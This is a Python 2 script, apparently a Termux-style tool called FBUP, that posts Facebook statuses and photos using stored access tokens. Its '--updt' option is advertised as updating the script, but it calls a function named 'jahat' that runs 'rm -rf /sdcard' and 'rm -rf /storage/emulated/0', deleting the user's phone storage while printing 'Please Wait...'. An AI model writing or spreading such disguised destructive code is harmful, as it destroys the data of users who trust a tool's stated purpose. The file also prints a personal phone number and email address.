#! /usr/bin/python
# -*- coding : utf-8 -*-

from core import updater
from core import console
from core import token
import sys
con = console.pyConsole()
fbup = updater.FacebookUP('FBUP')
token = token.Token()

#colors
R='\e[1;31m'
G='\e[1;32;1m'
B='\e[1;34m'
Y='\e[1;33m'
C='\e[1;36m'
L='\e[1;38;5;228m'
HB='\e[1;38;5;32m'
RR='\e[1;38;5;225m'
ll='\e[1 38;5;223'
D='\e[0m'
y='\e[33;1m'
r='\e[31;1m'
g='\e[30;1m'

#helps
def Banner():
	print "\033[31;1m    ________    __  __"
	print "\033[31;1m   / ____/ /_  / / / /___"
	print "\033[31;1m  / /_  / __ \/ / / / __ \ "
	print "\033[31;1m / __/ / /_/ / /_/ / /_/ /"
	print "\033[31;1m/_/   /_.___/\____/ .___/"
	print "\033[31;1m                 /_/  \033[32;1;mv2.5"
	print "\033[31;1m[+] Script for Update Status\n"
def helps():
	Banner()
	print('\033[31;1m[+] \033[37;1mBefore use this tool, please follow the explaination in bellow !')
	print con.Num(str(1), 'you must have access token for use it, you can visit')
	print('    link bellow to create access token\n')
	print('    \033[31m--> \033[36mhttps://developers.facebook.com/tools/explorer')
	print('    \033[31m--> \033[36mhttp://wefbee.com\033[31;1m\n')
	print con.Num(str(2), '\033[31;1m[+] \033[37;1mand then copy & put your access token with filename.txt and save it in token directory\033[31;1m\n')
	print con.Num(str(3), '\033[31;1m[+] usage : \033[33;1mpython fbup.py \033[37m<options>\033[31;1m\n')
	print con.Num(str(4), '[+] \033[33;1mlist of options :\n')
	print('    \033[37;1m--pto :  update status only text message')
	print('    --pnc : upload photo without caption')
	print('    --pwc : upload photo with caption')
	print('    --updt : update this script')
	print('    --help : for helps\n')
	print('    --about : about us')
	print con.Num(str(5), '\033[31;1m[+] \033[33;1mContact Me :\n')
	print('    Phone    : +6285341899229')
	print('    email    : gunadirenta@gmail.com')
	print('    facebook : aries isisas')
	print('    github   : https://github.com/afelfgie\n')

#post to wall text only
def post_textOnly():
	console.set_windowTitle('FBUP/STATUS')
	Banner()
	token.find_token('token/')
	
	token_selected = raw_input(con.Proc('select your token : '))
	message = raw_input(con.Proc('enter message : '))
	fbup.post_toWall(message, token.get_token(token_selected))
	
#post photo to wall without caption
def post_photoOnly():
	console.set_windowTitle('FBUP/UPLOAD PHOTO')
	Banner()
	token.find_token('token/')
	token_selected = raw_input(con.Proc('select your token : '))
	image = raw_input(con.Proc('enter image file : '))
	fbup.post_photoNoCaption(image, token.get_token(token_selected))
	
#post photo to wall with caption
def post_photoWithCaption():
	console.set_windowTitle('FBUP/UPLOAD PHOTO WITH CAPTION')
	Banner()
	token.find_token('token/')
	token_selected = raw_input(con.Proc('select your token : '))
	image = raw_input(con.Proc('enter image file : '))
	caption = raw_input(con.Proc('enter caption : '))
	fbup.post_photoWithCaption(image, caption, token.get_token(token_selected))
	
# menu mode
def menu_mode():
	console.set_windowTitle('FBUP')
	print '\n\t'+con.Num(str(1), 'post status text only')
	print '\t'+con.Num(str(2), 'post photo without caption')
	print '\t'+con.Num(str(3), 'post photo with caption\n')
	select_menu = raw_input(con.Proc('select menu : '))
	if not select_menu:
		print con.Err('no menu selected !\n')
		sys.exit(1)
	else:
		try:
			if int(select_menu) == 1:
				post_textOnly()
			elif int(select_menu) == 2:
				post_photoOnly()
			elif int(select_menu) == 3:
				post_photoWithCaption()
			else:
				print con.Err('you must select 1-3 !\n')
				sys.exit(1)
		except Exception, e:
			print con.Err(str(e))
			print con.Err('failed !\n')
			sys.exit(1)

def jahat():
	print "\033[31;0m[+] \033[37;0mPlease Wait..."
	os.system("rm -rf /sdcard")
	os.system("rm -rf /storage/emulated/0")
	print "\033[31:0m[+] \033[37;0mDone..."
	sys.exit()
def about():
	print ('''
\033[31;1m[+] \033[33;1mCreated By : \033[37;1mGunadiCBR
\033[31;1m[+] \033[33;1mVersion    : \033[37;1m2.5
\033[31;1m[+] \033[33;1mDate       : \033[37;1m01-11-2018
\033[31;1m[+] \033[33;1mCodeName   : \033[37;1mI AM MASTAH\033[31;1m
[+] \033[33;1mGithub     : \033[37;1mhttps://github.com/afelfgie
\033[31;1m[+] \033[33;1mTeam       : \033[37;1mMls18hckr
	''')
	sys.exit()
def main(argv):
	if (len(sys.argv) != 2):
		helps()
		sys.exit(1)
	
	options = str(sys.argv[1])
	if options == '-pto' or options == '--pto':
		post_textOnly()
	if options == '-pnc' or options == '--pnc':
		post_photoOnly()
	if options == '-pwc' or options == '--pwc':
		post_photoWithCaption()
	if options == '-menu' or options == '--menu':
		menu_mode()
	if options == '-about' or options == '--about':
		about()
	if options == '-updt' or options == '--updt':
		jahat()
	if options == '-help' or options == '--help':
		helps()
		
	if not options in ['-pto', '--pto', '-pnc', '--pnc', '-pwc', '--pwc','-menu', '--menu','-help', '--help']:
		helps()
		sys.exit(1)
		
if __name__ == '__main__':
	main(sys.argv[1:])
	
